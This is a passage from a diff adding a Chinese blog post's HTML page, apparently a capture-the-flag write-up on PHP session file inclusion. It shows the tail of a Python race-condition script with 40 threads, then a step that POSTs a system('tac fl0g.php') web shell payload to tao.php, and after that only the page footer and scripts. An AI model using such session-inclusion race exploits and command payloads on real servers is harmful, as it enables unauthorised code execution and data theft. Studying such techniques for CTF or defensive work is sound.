</span><br><span class="line">		<span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.<span class="title function_ invoke__">Thread</span>(target=write,args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">		<span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.<span class="title function_ invoke__">Thread</span>(target=read,args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">	evnet.<span class="title function_ invoke__">set</span>()</span><br></pre></td></tr></table></figure>
+
+<p>出现+号后然后访问url&#x2F;tao.php。post传参2&#x3D;system(‘tac fl0g.php’); </p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605220034114.png" class="" title="image-20240605220034114">
+
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605220042848.png" class="" title="image-20240605220042848"></li>
+</ol>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+    
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Diurnal541
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="session文件包含">https://diurnal541.github.io/2024/06/05/session文件包含/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/05/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="日志文件包含">
+                  <i class="fa fa-angle-left"></i> 日志文件包含
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Diurnal541</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+<!--
+-->
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共3.5k字</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+
+</body>
+</html>
